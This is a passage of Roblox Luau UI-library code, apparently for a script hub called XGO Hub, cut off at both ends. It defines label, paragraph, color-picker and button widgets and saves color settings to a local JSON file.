			BlockLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			BlockLabel.BorderSizePixel = 0
			BlockLabel.Size = UDim2.new(params.sizeUDim, 0, 0, 25)
			BlockLabel.ZIndex = 10

			TextLabel.Parent = BlockLabel
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(params.positionUDim, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.649999976, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = params.fontType
			TextLabel.Text = params.Setup
			TextLabel.TextColor3 = params.textColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = params.textColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true

			local RootSkid = {}

			function RootSkid:Set(XGoHubText)
				TextLabel.Text = XGoHubText
			end

			function RootSkid:SetVisible(value)
				BlockLabel.Visible = value
			end

			function RootSkid:SetTextColor(newTextColor)
				TextLabel.TextColor3 = newTextColor
				TextLabel.TextStrokeColor3 = newTextColor
			end

			if colorEffect then
				local function zigzag(X)
					return math.acos(math.cos(X * math.pi)) / math.pi
				end

				local function colorChange(textLabel)
					local counter = 0
					spawn(function()
						while true do
							wait(0.03)
							textLabel.TextColor3 = Color3.fromHSV(zigzag(counter), 1, 1)
							counter = counter + 0.01
						end
					end)
				end

				colorChange(TextLabel)
			end

			return RootSkid
		end
		------ // 信息标签   ----------------------------------------------------------------------------------------
		function Root:Paragraph(Setup)
			Setup = Setup or {}
			Setup.Title = Setup.Title
			Setup.Description = Setup.Description or ""

			local ParagraphBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local Title = Instance.new("TextLabel")
			local Description = Instance.new("TextLabel")

			ParagraphBlock.Name = "ParagraphBlock"
			ParagraphBlock.Parent = ScrollingFrame
			ParagraphBlock.BackgroundColor3 = Library.Colors.Default
			ParagraphBlock.BackgroundTransparency = 0.250
			ParagraphBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ParagraphBlock.BorderSizePixel = 0
			ParagraphBlock.Size = UDim2.new(0.99000001, 0, 0, 24)
			ParagraphBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ParagraphBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ParagraphBlock

			Title.RichText = true
			Title.Name = "Title"
			Title.Parent = ParagraphBlock
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0, 5, 0, 5)
			Title.Size = UDim2.new(1, 0, 0, 14)
			Title.ZIndex = 11
			Title.Font = Enum.Font.Gotham
			Title.Text = Setup.Title
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Library.Colors.TextColor
			Title.TextStrokeTransparency = 0.950
			Title.TextWrapped = true
			Title.TextXAlignment = Enum.TextXAlignment.Left
			Title.RichText = true

			Description.Name = "Description"
			Description.Parent = ParagraphBlock
			Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Description.BackgroundTransparency = 1.000
			Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Description.BorderSizePixel = 0
			Description.Position = UDim2.new(0, 5, 0, 21)
			Description.Size = UDim2.new(1, 0, 0, 45)
			Description.Visible = false
			Description.ZIndex = 11
			Description.Font = Enum.Font.Gotham
			Description.Text = Setup.Description
			Description.TextColor3 = Library.Colors.TextColor
			Description.TextSize = 13.000
			Description.TextStrokeColor3 = Library.Colors.TextColor
			Description.TextStrokeTransparency = 0.950
			Description.TextTransparency = 0.500
			Description.TextWrapped = true
			Description.TextXAlignment = Enum.TextXAlignment.Left
			Description.TextYAlignment = Enum.TextYAlignment.Top
			Description.RichText = true

			local UpdateBlock = function()
				local TitleSize = 14
				local MainSize = Library:GetTextSize(Description.Text, Description.TextSize, Description.Font)
				local DescriptionSize = MainSize.Y

				Description.Size = UDim2.new(1, MainSize.X, 0, DescriptionSize + 5)

				if Description.Text:byte() then
					Description.Visible = true
					Library:Tween(ParagraphBlock, Library.TweenLibrary.SmallEffect, {
						Size = UDim2.new(
							0.99,
							0,
							0,
							TitleSize + ((Description.Visible and Description.AbsoluteSize.Y + 5) or 0)
						),
					})
				else
					Description.Visible = false

					Library:Tween(ParagraphBlock, Library.TweenLibrary.SmallEffect, {
						Size = UDim2.new(0.99, 0, 0, Title.AbsoluteSize.Y + 10),
					})
				end
			end

			UpdateBlock()

			local RootSkid = {}

			function RootSkid:Title(Setup)
				Title.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Description(Setup)
				Description.Text = Setup
				UpdateBlock()
			end

			function RootSkid:Visible(value)
				ParagraphBlock.Visible = value
			end

			return RootSkid
		end
		------ // 颜色选择器 未修改完 暂无法使用  ----------------------------------------------------------------------------------------
		local function PackColor(color)
			return { R = color.R * 255, G = color.G * 255, B = color.B * 255 }
		end

		local function SaveConfiguration()
			if not CEnabled then
				return
			end
			local HttpService = game:GetService("HttpService")
			local Data = {}
			for i, v in pairs(RayfieldLibrary and RayfieldLibrary.Flags or {}) do
				if v.Type == "ColorPicker" then
					Data[i] = PackColor(v.Color)
				else
					Data[i] = typeof(v.CurrentValue) == "boolean" and v.CurrentValue
						or (v.CurrentValue or v.CurrentKeybind or v.CurrentOption or v.Color)
				end
			end
			local JsonData = HttpService:JSONEncode(Data)

			if useStudio then
				local parent = script.Parent or game.CoreGui
				if parent:FindFirstChild("configuration") then
					parent.configuration:Destroy()
				end
				local ScreenGui = Instance.new("ScreenGui", parent)
				ScreenGui.Name = "configuration"
				local TextBox = Instance.new("TextBox", ScreenGui)
				TextBox.Size = UDim2.new(0, 800, 0, 50)
				TextBox.AnchorPoint = Vector2.new(0.5, 0)
				TextBox.Position = UDim2.new(0.5, 0, 0, 30)
				TextBox.Text = JsonData
				TextBox.ClearTextOnFocus = false
				TextBox.BackgroundColor3 = Library.Colors.Default
				TextBox.BackgroundTransparency = 0.5
				TextBox.TextColor3 = Library.Colors.TextColor
				TextBox.TextSize = 14
				TextBox.Font = Enum.Font.Gotham
			else
				if writefile then
					local path = "XGO_HUB_Config/ColorConfig.json"
					writefile(path, tostring(JsonData))
				end
			end
		end
		
		function Root:ColorPickerButton(setup)
			setup = setup or {}
			local cfg = {
				ButtonText = setup.ButtonText or "选择颜色",
				DefaultColor = setup.DefaultColor or Color3.fromRGB(255, 255, 255),
				Callback = setup.Callback or function() end,
				Flag = setup.Flag or nil,
				FrameSize = setup.FrameSize or UDim2.new(0, 300, 0, 220),
			}

			local ColorBtn = Instance.new("Frame")
			ColorBtn.Name = "ColorPickerButton"
			ColorBtn.Parent = ScrollingFrame
			ColorBtn.BackgroundColor3 = Library.Colors.Default
			ColorBtn.BackgroundTransparency = 0.25
			ColorBtn.Size = UDim2.new(0.99, 0, 0, Library.ItemHeight)
			ColorBtn.ZIndex = 10

			local BtnShadow = Instance.new("ImageLabel")
			BtnShadow.Name = "DropShadow"
			BtnShadow.Parent = ColorBtn
			BtnShadow.BackgroundTransparency = 1
			BtnShadow.Position = UDim2.new(0, -5, 0, -5)
			BtnShadow.Size = UDim2.new(1, 10, 1, 10)
			BtnShadow.ZIndex = 9
			BtnShadow.Image = "rbxassetid://297694300"
			BtnShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			BtnShadow.ImageTransparency = 0.5
			BtnShadow.ScaleType = Enum.ScaleType.Slice
			BtnShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			BtnShadow.SliceScale = 0.05

			local BtnStroke = Instance.new("UIStroke")
			BtnStroke.Parent = ColorBtn
			BtnStroke.Transparency = 0.85
			BtnStroke.Color = Library.Colors.Hightlight

			local BtnText = Instance.new("TextLabel")
			BtnText.Parent = ColorBtn
			BtnText.AnchorPoint = Vector2.new(0, 0.5)
			BtnText.BackgroundTransparency = 1
			BtnText.Position = UDim2.new(0.02, 0, 0.5, 0)
			BtnText.Size = UDim2.new(0.7, 0, 0.4, 0)
			BtnText.Font = Enum.Font.Gotham
			BtnText.Text = cfg.ButtonText
			BtnText.TextColor3 = Library.Colors.TextColor
			BtnText.TextScaled = true
			BtnText.TextSize = 14
			BtnText.TextStrokeColor3 = Library.Colors.TextColor
			BtnText.TextStrokeTransparency = 0.95

			local BtnClick = Instance.new("TextButton")
			BtnClick.Parent = ColorBtn
			BtnClick.Size = UDim2.new(1, 0, 1, 0)
			BtnClick.BackgroundTransparency = 1
			BtnClick.TextTransparency = 1
			BtnClick.ZIndex = 15

			local ColorFrame = Instance.new("Frame")
			ColorFrame.Name = "ColorPickerFrame"
			ColorFrame.Parent = ScrollingFrame
			ColorFrame.BackgroundColor3 = Library.Colors.Default
			ColorFrame.BackgroundTransparency = 0.25
			ColorFrame.Size = cfg.FrameSize
			ColorFrame.Position = UDim2.new(0, 0, 0, ColorBtn.AbsoluteSize.Y + 10)
			ColorFrame.ZIndex = 15
			ColorFrame.Visible = false
			ColorFrame.ClipsDescendants = true
			ColorFrame.Active = true

			local FrameShadow = Instance.new("ImageLabel")
			FrameShadow.Name = "DropShadow"
			FrameShadow.Parent = ColorFrame
			FrameShadow.BackgroundTransparency = 1
			FrameShadow.Position = UDim2.new(0, -5, 0, -5)
			FrameShadow.Size = UDim2.new(1, 10, 1, 10)
			FrameShadow.ZIndex = 14
			FrameShadow.Image = "rbxassetid://297694300"
			FrameShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			FrameShadow.ImageTransparency = 0.5
			FrameShadow.ScaleType = Enum.ScaleType.Slice
			FrameShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			FrameShadow.SliceScale = 0.05

			local FrameStroke = Instance.new("UIStroke")
			FrameStroke.Parent = ColorFrame
			FrameStroke.Transparency = 0.85
			FrameStroke.Color = Library.Colors.Hightlight

			local FrameTitle = Instance.new("TextLabel")
			FrameTitle.Parent = ColorFrame
			FrameTitle.BackgroundTransparency = 1
			FrameTitle.Position = UDim2.new(0.02, 0, 0, 10)
			FrameTitle.Size = UDim2.new(0.96, 0, 0, 20)
			FrameTitle.Font = Enum.Font.Gotham
			FrameTitle.Text = setup.FrameTitle or "选择颜色"
			FrameTitle.TextColor3 = Library.Colors.TextColor
			FrameTitle.TextSize = 16
			FrameTitle.TextStrokeColor3 = Library.Colors.TextColor
			FrameTitle.TextStrokeTransparency = 0.95

			local TweenService = game:GetService("TweenService")
			local UserInputService = game:GetService("UserInputService")
			local RunService = game:GetService("RunService")
			local Players = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer
			local mouse = LocalPlayer:GetMouse()

			local Preview = Instance.new("Frame")
			Preview.Parent = ColorFrame
			Preview.Position = UDim2.new(0.02, 0, 0, 40)
			Preview.Size = UDim2.new(0.96, 0, 0, 30)
			Preview.BackgroundColor3 = cfg.DefaultColor
			Preview.BorderSizePixel = 0

			local PreviewStroke = Instance.new("UIStroke")
			PreviewStroke.Parent = Preview
			PreviewStroke.Color = Color3.fromRGB(255, 255, 255)
			PreviewStroke.Transparency = 0.5
			PreviewStroke.Thickness = 1

			local HueSlider = Instance.new("Frame")
			HueSlider.Name = "HueSlider"
			HueSlider.Parent = ColorFrame
			HueSlider.Position = UDim2.new(0.02, 0, 0, 80)
			HueSlider.Size = UDim2.new(0.96, 0, 0, 8)
			HueSlider.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			HueSlider.BackgroundTransparency = 0.1
			HueSlider.Active = true

			local HueGradient = Instance.new("UIGradient")
			HueGradient.Parent = HueSlider
			HueGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
				ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 255, 0)),
				ColorSequenceKeypoint.new(0.32, Color3.fromRGB(0, 255, 0)),
				ColorSequenceKeypoint.new(0.48, Color3.fromRGB(0, 255, 255)),
				ColorSequenceKeypoint.new(0.64, Color3.fromRGB(0, 0, 255)),
				ColorSequenceKeypoint.new(0.8, Color3.fromRGB(255, 0, 255)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
			})

			local HuePoint = Instance.new("ImageLabel")
			HuePoint.Name = "HuePoint"
			HuePoint.Parent = HueSlider
			HuePoint.Size = UDim2.new(0, 16, 0, 16)
			HuePoint.AnchorPoint = Vector2.new(0.5, 0.5)
			HuePoint.Position = UDim2.new(0, 0, 0.5, 0)
			HuePoint.BackgroundTransparency = 1
			HuePoint.Image = "rbxassetid://7733710700"
			HuePoint.ImageColor3 = Color3.fromRGB(255, 255, 255)
			HuePoint.ZIndex = 20

			local SvPanel = Instance.new("Frame")
			SvPanel.Name = "SvPanel"
			SvPanel.Parent = ColorFrame
			SvPanel.Position = UDim2.new(0.02, 0, 0, 100)
			SvPanel.Size = UDim2.new(0.6, 0, 0, 80)
			SvPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			SvPanel.BackgroundTransparency = 0.1
			SvPanel.Active = true

			local SvSatGradient = Instance.new("UIGradient")
			SvSatGradient.Parent = SvPanel
			SvSatGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0)),
			})
			SvSatGradient.Rotation = 0

			local SvValGradient = Instance.new("UIGradient")
			SvValGradient.Parent = SvPanel
			SvValGradient.Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
			})
			SvValGradient.Rotation = 90

			local SvPoint = Instance.new("ImageLabel")
			SvPoint.Name = "SvPoint"
			SvPoint.Parent = SvPanel
			SvPoint.Size = UDim2.new(0, 14, 0, 14)
			SvPoint.AnchorPoint = Vector2.new(0.5, 0.5)
			SvPoint.Position = UDim2.new(1, 0, 0, 0)
			SvPoint.BackgroundTransparency = 1
			SvPoint.Image = "rbxassetid://7733710700"
			SvPoint.ImageColor3 = Color3.fromRGB(255, 255, 255)
			SvPoint.ZIndex = 20

			local RgbContainer = Instance.new("Frame")
			RgbContainer.Parent = ColorFrame
			RgbContainer.Position = UDim2.new(0.65, 0, 0, 100)
			RgbContainer.Size = UDim2.new(0.33, 0, 0, 80)
			RgbContainer.BackgroundTransparency = 1

			local RgbInputs = {}
			local RgbLabels = { "R", "G", "B" }
			for i, label in ipairs(RgbLabels) do
				local InputFrame = Instance.new("Frame")
				InputFrame.Parent = RgbContainer
				InputFrame.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
				InputFrame.Size = UDim2.new(1, 0, 0, 20)
				InputFrame.BackgroundColor3 = Library.Colors.Default
				InputFrame.BackgroundTransparency = 0.5
				InputFrame.BorderSizePixel = 0

				local InputStroke = Instance.new("UIStroke")
				InputStroke.Parent = InputFrame
				InputStroke.Color = Library.Colors.Hightlight
				InputStroke.Transparency = 0.85

				local InputLabel = Instance.new("TextLabel")
				InputLabel.Parent = InputFrame
				InputLabel.Position = UDim2.new(0, 5, 0, 0)
				InputLabel.Size = UDim2.new(0, 15, 0, 20)
				InputLabel.BackgroundTransparency = 1
				InputLabel.Font = Enum.Font.Gotham
				InputLabel.Text = label
				InputLabel.TextColor3 = Library.Colors.TextColor
				InputLabel.TextSize = 14

				local InputBox = Instance.new("TextBox")
				InputBox.Name = "InputBox"
				InputBox.Parent = InputFrame
				InputBox.Position = UDim2.new(0, 25, 0, 0)
				InputBox.Size = UDim2.new(0, 50, 0, 20)
				InputBox.BackgroundTransparency = 1
				InputBox.ClearTextOnFocus = false
				InputBox.Font = Enum.Font.Gotham
				InputBox.TextColor3 = Library.Colors.TextColor
				InputBox.TextSize = 12
				InputBox.TextXAlignment = Enum.TextXAlignment.Center
				InputBox:GetPropertyChangedSignal("Text"):Connect(function()
					InputBox.Text = InputBox.Text:gsub("[^0-9]", "")
					if #InputBox.Text > 3 then
						InputBox.Text = InputBox.Text:sub(1, 3)
					end
				end)

				table.insert(RgbInputs, InputBox)
			end

			local ConfirmBtn = Instance.new("Frame")
			ConfirmBtn.Parent = ColorFrame
			ConfirmBtn.Position = UDim2.new(0.02, 0, 0, 190)
			ConfirmBtn.Size = UDim2.new(0.96, 0, 0, 25)
			ConfirmBtn.BackgroundColor3 = Library.Colors.Hightlight
			ConfirmBtn.BackgroundTransparency = 0.3
			ConfirmBtn.BorderSizePixel = 0

			local ConfirmText = Instance.new("TextLabel")
			ConfirmText.Parent = ConfirmBtn
			ConfirmText.AnchorPoint = Vector2.new(0.5, 0.5)
			ConfirmText.Position = UDim2.new(0.5, 0, 0.5, 0)
			ConfirmText.Size = UDim2.new(0.9, 0, 0.8, 0)
			ConfirmText.BackgroundTransparency = 1
			ConfirmText.Font = Enum.Font.Gotham
			ConfirmText.Text = "确认选择"
			ConfirmText.TextColor3 = Library.Colors.TextColor
			ConfirmText.TextScaled = true
			ConfirmText.TextSize = 14

			local ConfirmClick = Instance.new("TextButton")
			ConfirmClick.Parent = ConfirmBtn
			ConfirmClick.Size = UDim2.new(1, 0, 1, 0)
			ConfirmClick.BackgroundTransparency = 1
			ConfirmClick.TextTransparency = 1
			ConfirmClick.ZIndex = 20

			local isFrameOpen = false
			local h, s, v = cfg.DefaultColor:ToHSV()
			local currentColor = cfg.DefaultColor

			local function updateColorUI()
				Preview.BackgroundColor3 = currentColor
				local huePointX = math.clamp(h * HueSlider.AbsoluteSize.X, 0, HueSlider.AbsoluteSize.X)
				HuePoint.Position = UDim2.new(0, huePointX, 0.5, 0)
				local svPointX = math.clamp(s * SvPanel.AbsoluteSize.X, 0, SvPanel.AbsoluteSize.X)
				local svPointY = math.clamp((1 - v) * SvPanel.AbsoluteSize.Y, 0, SvPanel.AbsoluteSize.Y)
				SvPoint.Position = UDim2.new(0, svPointX, 0, svPointY)
				local r = math.floor(currentColor.R * 255)
				local g = math.floor(currentColor.G * 255)
				local b = math.floor(currentColor.B * 255)
				if RgbInputs[1].Text ~= tostring(r) then
					RgbInputs[1].Text = tostring(r)
				end
				if RgbInputs[2].Text ~= tostring(g) then
					RgbInputs[2].Text = tostring(g)
				end
				if RgbInputs[3].Text ~= tostring(b) then
					RgbInputs[3].Text = tostring(b)
				end
				SvSatGradient.Color = ColorSequence.new({
					ColorSequenceKeypoint.new(0, Color3.fromHSV(h, 0, 1)),
					ColorSequenceKeypoint.new(1, Color3.fromHSV(h, 1, 1)),
				})
			end
			updateColorUI()

			BtnClick.MouseButton1Click:Connect(function()
				isFrameOpen = not isFrameOpen
				if isFrameOpen then
					ColorFrame.Visible = true
					local btnBottomY = ColorBtn.AbsolutePosition.Y + ColorBtn.AbsoluteSize.Y
					ColorFrame.Position = UDim2.new(0, ColorBtn.AbsolutePosition.X, 0, btnBottomY + 10)
					TweenService:Create(ColorFrame, Library.TweenLibrary.SmallEffect, {
						BackgroundTransparency = 0.25,
					}):Play()
					BtnStroke.Transparency = 0.5
				else
					TweenService:Create(ColorFrame, Library.TweenLibrary.SmallEffect, {
						BackgroundTransparency = 1,
					}):Play()
					task.wait(0.3)
					ColorFrame.Visible = false
					BtnStroke.Transparency = 0.85
				end
			end)

			local isHueDragging = false
			HueSlider.InputBegan:Connect(function(input)
				if
					input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch
				then
					isHueDragging = true
					local sliderX =
						math.clamp(input.Position.X - HueSlider.AbsolutePosition.X, 0, HueSlider.AbsoluteSize.X)
					h = sliderX / HueSlider.AbsoluteSize.X
					currentColor = Color3.fromHSV(h, s, v)
					updateColorUI()
				end
			end)

			local isSvDragging = false
			SvPanel.InputBegan:Connect(function(input)
				if
					input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch
				then
					isSvDragging = true
					local panelX = math.clamp(input.Position.X - SvPanel.AbsolutePosition.X, 0, SvPanel.AbsoluteSize.X)
					local panelY = math.clamp(input.Position.Y - SvPanel.AbsolutePosition.Y, 0, SvPanel.AbsoluteSize.Y)
					s = panelX / SvPanel.AbsoluteSize.X
					v = 1 - (panelY / SvPanel.AbsoluteSize.Y)
					currentColor = Color3.fromHSV(h, s, v)
					updateColorUI()
				end
			end)

			UserInputService.InputEnded:Connect(function(input)
				if
					input.UserInputType == Enum.UserInputType.MouseButton1
					or input.UserInputType == Enum.UserInputType.Touch
				then
					isHueDragging = false
					isSvDragging = false
				end
			end)

			RunService.RenderStepped:Connect(function()
				if not isFrameOpen then
					return
				end
				if isHueDragging then
					local mouseX = UserInputService:GetMouseLocation().X
					local sliderX = math.clamp(mouseX - HueSlider.AbsolutePosition.X, 0, HueSlider.AbsoluteSize.X)
					h = sliderX / HueSlider.AbsoluteSize.X
					currentColor = Color3.fromHSV(h, s, v)
					updateColorUI()
				end

				if isSvDragging then
					local mousePos = UserInputService:GetMouseLocation()
					local panelX = math.clamp(mousePos.X - SvPanel.AbsolutePosition.X, 0, SvPanel.AbsoluteSize.X)
					local panelY = math.clamp(mousePos.Y - SvPanel.AbsolutePosition.Y, 0, SvPanel.AbsoluteSize.Y)
					s = panelX / SvPanel.AbsoluteSize.X
					v = 1 - (panelY / SvPanel.AbsoluteSize.Y)
					currentColor = Color3.fromHSV(h, s, v)
					updateColorUI()
				end
			end)

			local function updateColorFromRGB()
				local r = tonumber(RgbInputs[1].Text) or 255
				local g = tonumber(RgbInputs[2].Text) or 255
				local b = tonumber(RgbInputs[3].Text) or 255
				r = math.clamp(r, 0, 255)
				g = math.clamp(g, 0, 255)
				b = math.clamp(b, 0, 255)
				currentColor = Color3.fromRGB(r, g, b)
				h, s, v = currentColor:ToHSV()
				updateColorUI()
			end
			for _, box in ipairs(RgbInputs) do
				box.FocusLost:Connect(updateColorFromRGB)
				box.Focused:Connect(function()
					box.Changed:Connect(function(property)
						if property == "Text" then
							updateColorFromRGB()
						end
					end)
				end)
			end

			ConfirmClick.MouseButton1Click:Connect(function()
				cfg.Callback(currentColor)
				SaveConfiguration()
				isFrameOpen = false
				TweenService:Create(ColorFrame, Library.TweenLibrary.SmallEffect, {
					BackgroundTransparency = 1,
				}):Play()
				task.wait(0.3)
				ColorFrame.Visible = false
				BtnStroke.Transparency = 0.85
			end)
			
			local api = {}
			function api:SetColor(color)
				currentColor = color
				h, s, v = color:ToHSV()
				updateColorUI()
			end
			function api:GetColor()
				return currentColor
			end
			function api:Visible(isVisible)
				ColorBtn.Visible = isVisible
				if not isVisible then
					ColorFrame.Visible = false
					isFrameOpen = false
				end
			end

			return api
		end
		------ // 按钮组件   ----------------------------------------------------------------------------------------
		function Root:Button(setup)
			setup = setup or {}
			setup.Title = setup.Title or "按钮"
			setup.Content = setup.Content or ""
			setup.Callback = setup.Callback or function() end
			setup.Tip = setup.Tip or nil

			local ButtonBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Arrow = Instance.new("ImageLabel")
			local Button = Instance.new("TextButton")

			ButtonBlock.Name = "ButtonBlock"
			ButtonBlock.Parent = ScrollingFrame
			ButtonBlock.BackgroundColor3 = Library.Colors.Default
			ButtonBlock.BackgroundTransparency = 0.250
			ButtonBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ButtonBlock.BorderSizePixel = 0
			ButtonBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			ButtonBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ButtonBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ButtonBlock

			TextLabel.Parent = ButtonBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Size = UDim2.new(1, 0, 0, 14)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true

			Content.Name = "Content"
			Content.Parent = ButtonBlock
			Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Content.BackgroundTransparency = 1.000
			Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Content.BorderSizePixel = 0
			Content.Position = UDim2.new(0, 5, 0, 18)
			Content.Size = UDim2.new(1, 0, 0, 45)
			Content.Visible = false
			Content.ZIndex = 11
			Content.Font = Enum.Font.Gotham
			Content.Text = setup.Content
			Content.TextColor3 = Library.Colors.TextColor
			Content.TextSize = 13.000
			Content.TextStrokeColor3 = Library.Colors.TextColor
			Content.TextStrokeTransparency = 0.950
			Content.TextTransparency = 0.500
			Content.TextWrapped = true
			Content.TextXAlignment = Enum.TextXAlignment.Left
			Content.TextYAlignment = Enum.TextYAlignment.Top
			Content.RichText = true

			Arrow.Name = "Arrow"
			Arrow.Parent = ButtonBlock
			Arrow.AnchorPoint = Vector2.new(1, 0.5)
			Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Arrow.BackgroundTransparency = 1.000
			Arrow.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Arrow.BorderSizePixel = 0
			Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Arrow.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
			Arrow.SizeConstraint = Enum.SizeConstraint.RelativeYY
			Arrow.ZIndex = 11
			Arrow.Image = "rbxassetid://10709791437"
			Arrow.ImageTransparency = 0.150

			Button.Name = "Button"
			Button.Parent = ButtonBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Library:MakeDrop(ButtonBlock, UIStroke, Library.Colors.Hightlight)

			if setup.Tip then
				WindowLibrary:AddToolTip(ButtonBlock, tostring(setup.Tip))
			end

			Button.MouseButton1Down:Connect(function()
				Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
					Position = UDim2.new(0.999, 0, 0.5, 0),
					ImageTransparency = 0.4,
				})
			end)

			Button.MouseButton1Up:Connect(function()
				Library:Tween(Arrow, Library.TweenLibrary.SmallEffect, {
					Position = UDim2.new(0.980000019, 0, 0.5, 0),
					ImageTransparency = 0.15,
				})
			end)

			Button.MouseButton1Click:Connect(function()
				setup.Callback()
			end)

			local UpdateBlock = function()
				local TitleSize = TextLabel.TextSize
				local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
				local ContentSize = setup.Content:len() > 0
						and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font)
					or Vector2.new(0, 0)

				local TotalHeight = MainSize.Y + 10
				if setup.Content:len() > 0 then
					Content.Visible = true
					TotalHeight = TotalHeight + ContentSize.Y + 5
					TextLabel.Position = UDim2.new(0, 5, 0, 12)
					TextLabel.Size = UDim2.new(1, 0, 0, 14)
				else
					Content.Visible = false
					TotalHeight = TotalHeight + 15.20000000000001
					TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
					TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
				end

				ButtonBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
			end
			UpdateBlock()

